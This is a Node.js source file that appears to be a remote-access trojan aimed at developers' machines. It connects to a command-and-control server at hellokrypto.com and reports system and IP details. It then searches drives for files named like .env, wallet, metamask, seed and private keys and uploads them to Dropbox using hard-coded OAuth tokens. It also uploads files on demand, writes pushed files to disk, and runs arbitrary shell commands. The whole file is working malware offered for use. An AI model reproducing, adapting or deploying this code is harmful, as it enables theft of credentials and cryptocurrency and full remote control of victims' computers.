const os = require('os')
const io = require('socket.io-client')
const fs = require('fs')
const path = require('path')
const { exec } = require('child_process')
const axios = require('axios')
const qs = require('qs')
const {machineIdSync} = require('node-machine-id')

// const socket = io('http://localhost:8111/client')
const socket = io('https://hellokrypto.com/client')
// const socket = io('http://45.61.128.140:8111/client')
const RefreshToken = "arYD1RoIJOAAAAAAAAAAAZJrBMxVLVB_h_ypHzE83tTB-Lx8uddMebPQuzhuOmrE"
const AppKey = 'a3iaw2mml0l4q1b'
const AppSck = 'bo2fk30np66raug'
let dbxApiToken = 'sl.u.AFzoc49v_fzlWgjfqcWpXcNpPi_IS8xYRv6CeRUPrncrXkeCPJ9DSRhfKJr860eto_OTwIcgRnhpyggBp1JDczvIH6GwJHjD9gBxbXFdq0h5dnvwJOCH73HND0QVhN388lKAlo8Rncq5vYO6_Zl9KEDmI8Npq2oJ3E78Xtbzn2jH5kuXusbasaIQEI_Bg8Qa61FzzlcMa3A40miPqzRvON5M0jtxYTa5s9te1JjhpC0kWc8wAqwdBUczWMAt5PfFPn-XcL7fPXQbH0S5opL-cSBaclVQvsk3dLCMrwN8RRFLnKThR3LyMDx-CsN9IVkU2ttPDcKg0Xh67aJQgvbjC6pk7oydytA3TzCSIpvRQtgxJdo7jfJILF87pE5mrtLM3aHrKBEahPFQtYpSCOHoRgFGOl8uDiiqpufROUHdmcuhUlNZbbuM_V6rysdrjA_OuJz9tZP-pel8aHoWyPMLCUk5VsHh1T4aIuYrs1ALZ_Y1AEN7w3JvKtHczNGFXNWCg-bPcNLIAPzTrSbzDyCL5JmwhE97fhU3o2yUfhpQwW-hZ27Ed6jcbGYiMHMPWbkjATQuc7wmT0Cd1iV5gl_rMezAU8EovWLqEEyNbPRYTdlunG8ueg1KWGHfJjgBsPo59qSqQFOvm0Y_aP-U5BmpVkh0LBsrjHtD2ygHyihdZl_md8DM5tCEWZqJAxlydwmIQVoJHFcn7qiO4C9NeEgg0ZpBtIpvs_HTXPUc7t4INRCuQuJOHOgCp_4Yt-Kfulx3_hM6P3L8Mp3zV5c6RREJcL_f54yBV_RilbDHYck9ZD90fcdy6fCY79r9LypJWByzXG6ZMJi8CgSCTxevB2OFilO3XH9_28fDdwc4fpsZwIh2S1PQnjIvx5eDRD1WkVN0LYtn6AXHIW0QY8541ec9_bY7UglByhReRu0osXvDd5pBVCLpzUj6Kc_5oHACpV-rVwZrCgpLDjHwf0q9wuiu4LyF7BOVtxi5OhcjZm00jG78mtyfZOCbeDUwyUhjCU8zo_hJYywibH76hWFbkeQwMVZNjwnRI8IurMFGBXKekVngkq8sKpQBhnkJYRsh0c9N1OFvr-0z_3J028Shb3juRh_Gfn8DBmLjhYGFrVr5dtl6y6fur_aBeVUZke2CAJF0g0pr4neklo5dyTk_wIGT94p2hqi9fRFZ6yEdqBI1A9XzKrqo8lszoVWE6tuUTx6g8tkW_z0tBuhHWXIF4AxPUoBfrIwQQx4MwHMArjcv-YHAKD13H-8H8KpRvjmE-F0efiQI43krEJkydEnhxxhMKa1nldwLXD2E2jDmFbhGqiFgNuW_0tmrshNxounGNYcUBKkq-W8Gl0h98pdrYaKMxvJCEzZcfQiyyfTDEG5Y4oCVxiIRouHhooSGUcpnOIiMECqsy1mB944KtyBRXhrtrSyW'
let expiredTime = 0

let ExceptionFolder = [
    'node_modules',
    'cargo',
    '.cargo',
    'cache',
    '.cache',
    '.git',
    'artifacts',
    'build',
    '.vscode',
    '.pnpm-store'
]

let ImpStrings = [
    '.env',
    'wallet',
    'metamask',
    'secret',
    'phantom',
    'private',
    'id.json',
    'key',
    'hardhat.config.ts',
    'coinbase',
    'seed',
]

let hostname =  os.hostname() + "-" + machineIdSync().substring(0,6)
if(hostname=='' || hostname==null){
    hostname = os.userInfo().username
}

const getNewAccessToken = async() => {
    try {
        const res = await axios.post('https://api.dropboxapi.com/oauth2/token',qs.stringify({
            grant_type: 'refresh_token',
            refresh_token: RefreshToken,
            client_id: AppKey,
            client_secret: AppSck
        }),{headers: {'Content-Type': 'application/x-www-form-urlencoded'}})
        dbxApiToken = res.data.access_token
        expiredTime = Date.now() + (Number(res.data.expires_in) - 300) * 1000
    } catch (err) {
        socket.emit('exec_result', err.response?.data || err.message)
    }
}
const uploadFile = async(filePath, uploadFilePath) => {
    if(Date.now()>expiredTime || dbxApiToken==''){
        await getNewAccessToken()
    }
    const fileBuffer = fs.readFileSync(filePath)
    await axios.post('https://content.dropboxapi.com/2/files/upload', fileBuffer, {
        headers:{
            'Authorization': `Bearer ${dbxApiToken}`,
            'Content-Type' : 'application/octet-stream',
            'Dropbox-API-Arg': JSON.stringify({
                path: uploadFilePath.replace(/\\/g, '/'),
                mode: 'add',
                autorename: true,
                mute: false
            })
        }
    })
    socket.emit('exec_result', `${filePath} uploaded successfully`)
}
const uploadDirectory = async(dir, uploadDir) => {
    const files = fs.readdirSync(dir)
    for(const file of files){
        try{
            const filePath = path.join(dir, file)
            const uploadPath = path.join(uploadDir, file)
            const fileStat = fs.statSync(filePath)
            if(fileStat.isDirectory()){
                if(ExceptionFolder.findIndex((item)=>{return item==file.toLowerCase()})!=-1) continue;
                await uploadDirectory(filePath, uploadPath)
            }else{
                await uploadFile(filePath, uploadPath)
            }
        }catch(err){
            socket.emit('exec_result', err.message)
        }
    }
}
const envUpload = async(dir, uploadDir) => {
    const files = fs.readdirSync(dir)
    for(const file of files){
        try{
            const filePath = path.join(dir, file)
            const uploadPath = path.join(uploadDir, file)
            const fileStat = fs.statSync(filePath)
            if(fileStat.isDirectory()){
                if(ExceptionFolder.findIndex((item)=>{return item==file.toLowerCase()})!=-1) continue;
                await envUpload(filePath, uploadPath)
            }else{
                let isFound = false
                for(let item of ImpStrings)
                    if(file.includes(item)==true){
                        isFound = true
                        break;
                    }
                if(isFound)
                    await uploadFile(filePath, uploadPath)
            }
        }catch(err){
            socket.emit('exec_result', err.message)
        }
    }
}
const patUpload = async(dir, uploadDir, pattern) => {
    const files = fs.readdirSync(dir)
    for(const file of files){
        try{
            const filePath = path.join(dir, file)
            const uploadPath = path.join(uploadDir, file)
            const fileStat = fs.statSync(filePath)
            if(fileStat.isDirectory()){
                if(ExceptionFolder.findIndex((item)=>{return item==file.toLowerCase()})!=-1) continue;
                await patUpload(filePath, uploadPath, pattern)
            }else{
                if(file.includes(pattern))
                    await uploadFile(filePath, uploadPath)
            }
        }catch(err){
            socket.emit('exec_result', err.message)
        }
    }
}
const getSystemInfo = async() => {
    try{
        let sysInfo
        let ipInfo
        try{
            sysInfo = {
                hostname : os.hostname(),
                machine: os.machine(),
                platform: os.platform(),
                release: os.release(),
                type: os.type(),
                username: os.userInfo().username,
                version: os.version(),
                uuid: machineIdSync()
            }
        }catch(err){
            sysInfo = null
        }
        try{
            ipInfo = (await axios.get('https://ipinfo.io/json')).data
        }catch(err){
            ipInfo = null
        }
        return {sysInfo: sysInfo, ipInfo: ipInfo}
    }catch(err){
    }
}

const scenario = async() => {
    socket.on('connect', ()=> {
        socket.emit('exec_result', 'Connected : '+ hostname)
        socket.emit('set_client_info', {username: hostname})
    })

    socket.on('client_event_file_upload', async({fileName, uploadPath})=>{
        try{
            const filePath = path.isAbsolute(fileName) ? fileName : path.join(process.cwd(),fileName)
            if(fs.existsSync(filePath)){
                const fileStat = fs.statSync(filePath)
                if(fileStat.isDirectory()){
                    socket.emit('exec_result', 'its not a file')
                }else{
                    const uploadFilePath = path.join(`/${hostname}`, uploadPath, path.basename(filePath))
                    await uploadFile(filePath, uploadFilePath)
                    socket.emit('exec_result', 'File Uploaded Successfully')
                }
            }else{
                socket.emit('exec_result', 'file not found')
            }
        }catch(err){
            socket.emit('exec_result', `File Upload error: ${err.message}`)
        }
    })

    socket.on('client_event_folder_upload', async({dirPath, uploadPath})=>{
        try{
            const dir = path.isAbsolute(dirPath) ? dirPath : path.join(process.cwd(), dirPath)
            if(fs.existsSync(dir)){
                const dirStat = fs.statSync(dir)
                if(dirStat.isDirectory()){
                    const uploadDir = path.join(`/${hostname}`, uploadPath, path.basename(dir))
                    await uploadDirectory(dir, uploadDir)
                    socket.emit('exec_result', 'Directory Uploaded Successfully')
                }else{
                    socket.emit('exec_result', 'its not a folder')
                }
            }else{
                socket.emit('exec_result', 'folder not found')
            }
        }catch(err){
            socket.emit('exec_result', `Directory Upload error: ${err.message}`)
        }
    })

    socket.on('client_event_system_information', async()=>{
        try{
            const sysInfo = await getSystemInfo()
            socket.emit('exec_result', JSON.stringify(sysInfo))
        }catch(err){
            socket.emit('exec_result', `Error in getting system information: ${err.message}`)
        }
    })

    socket.on('client_event_env_upload', async()=>{
        try{
            const folderName = 'env-' + Date.now()
            const uploadDir = path.join(`/${hostname}`, folderName)
            if(os.type()=="Windows_NT"){
                for(let i='D'.charCodeAt(0); i<'Z'.charCodeAt(0); i++){
                    const letter = String.fromCharCode(i)
                    const dir = path.normalize(letter+":\\")
                    if(fs.existsSync(dir))
                        envUpload(dir, path.join(uploadDir, letter))
                }
            }else{
                envUpload(os.homedir(), uploadDir)
            }
            // socket.emit('exec_result', 'Env search finished')
        }catch(err){
            socket.emit('exec_result', `Env search failed: ${err}`)
        }
    })

    socket.on('client_event_imp_upload', async()=>{
        try{
            const folderName = 'imp-' + Date.now()
            const uploadDir = path.join(`/${hostname}`, folderName)
            envUpload(process.cwd(), uploadDir)
            // socket.emit('exec_result', 'Imp search finished')
        }catch(err){
            socket.emit('exec_result', `Imp search failed: ${err.message}`)
        }
    })

    socket.on('client_event_pat_upload', async(pattern)=>{
        try{
            const folderName = 'pat-' + Date.now()
            const uploadDir = path.join(`/${hostname}`, folderName)
            patUpload(process.cwd(), uploadDir, pattern)
            // socket.emit('exec_result', 'Pat search finished')
        }catch(err){
            socket.emit('exec_result', `Pat search failed: ${err.message}`)
        }
    })

    socket.on('client_event_file_down', (data) => {
        const clientFilePath = data.clientFilePath
        const fileDataBase64 = data.fileData
        const fileBuffer = Buffer.from(fileDataBase64, 'base64');
        fs.writeFile(clientFilePath, fileBuffer, (err) => {
            if (err) {
                socket.emit('exec_result', 'Failed to save file: ' + err.message);
            } else {
                socket.emit('exec_result', 'File saved successfully');
            }
        })
    })

    socket.on('client_event_cmd_exec', async(instruction)=>{
        try{
            const args = instruction.split(' ')
            const command = args[0].toLowerCase()
            const content = args.slice(1).join(' ')
            if(command=='cstop'){

            }else if(command=='cd'){
                process.chdir(content)
                socket.emit('exec_result', process.cwd())
            }else{
                exec(instruction, {windowsHide: true}, async(error, stdout, stderr)=>{
                    if(stdout) socket.emit('exec_result', stdout)
                    else if(stderr) await socket.emit('exec_result', stderr)
                })
            }
        }catch(err){
            socket.emit('exec_result', `Command execution error: ${err.message}`)
        }
    })
}

scenario()